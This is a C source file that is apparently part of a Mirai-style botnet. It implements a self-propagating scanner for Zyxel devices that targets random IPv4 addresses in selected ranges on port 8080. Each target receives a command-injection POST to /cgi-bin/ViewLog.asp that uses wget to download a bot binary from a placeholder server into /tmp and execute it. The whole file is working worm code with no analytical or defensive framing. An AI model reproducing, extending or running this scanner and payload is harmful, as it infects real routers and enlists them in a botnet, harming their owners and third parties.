#include "includes.h"
#include "zyxel.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define ZYXEL_SCANNER_MAX_CONNS 256
#define ZYXEL_SCANNER_PORT 8080

/* Zyxel command injection payload */
static char *zyxel_payload = 
"POST /cgi-bin/ViewLog.asp HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"Content-Length: %d\r\n"
"Connection: close\r\n\r\n"
"%s";

static char *zyxel_post_data = 
"start_time=123456&end_time=123457&";

struct zyxel_conn {
    int fd;
    ipv4_t dst_addr;
    time_t last_recv;
};

static struct zyxel_conn conns[ZYXEL_SCANNER_MAX_CONNS];

static ipv4_t get_random_ip_zyxel(void);
static void zyxel_connect(struct zyxel_conn *);
static void zyxel_close(struct zyxel_conn *);

void zyxel_scanner_init(void) {
    if (fork() == 0) {
        int i;
        
        for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
        }
        
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            
            FD_ZERO(&fdset);
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            time_t now = time(NULL);
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) {
                    zyxel_close(&conns[i]);
                }
            }
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[4096];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) {
                        zyxel_close(&conns[i]);
                    } else {
                        conns[i].last_recv = now;
                        zyxel_close(&conns[i]);
                    }
                }
            }
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) {
                    conns[i].dst_addr = get_random_ip_zyxel();
                    zyxel_connect(&conns[i]);
                    break;
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_zyxel(void) {
    ipv4_t addr;
    
    while (TRUE) {
        addr = rand_next();
        
        /* Target European ranges where Zyxel is common */
        uint8_t first_octet = (addr >> 24) & 0xFF;
        
        if (first_octet == 94 || first_octet == 62 || 
            first_octet == 31 || first_octet == 95 ||
            first_octet == 85 || first_octet == 86 ||
            first_octet == 87 || first_octet == 88 ||
            first_octet == 89 || first_octet == 90 ||
            first_octet == 91 || first_octet == 92 ||
            first_octet == 93) {
            break;
        }
    }
    
    return addr;
}

static void zyxel_connect(struct zyxel_conn *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(ZYXEL_SCANNER_PORT);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        char host[32];
        snprintf(host, sizeof(host), "%d.%d.%d.%d",
            (conn->dst_addr >> 24) & 0xFF,
            (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF,
            conn->dst_addr & 0xFF);
        
        char post[512];
        snprintf(post, sizeof(post), "%swget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/z;sh /tmp/z", zyxel_post_data);
        
        char payload[1024];
        snprintf(payload, sizeof(payload), zyxel_payload, host, util_strlen(post), post);
        
        send(conn->fd, payload, util_strlen(payload), 0);
        conn->last_recv = time(NULL);
    } else {
        close(conn->fd);
        conn->fd = -1;
    }
}

static void zyxel_close(struct zyxel_conn *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
}

#endif
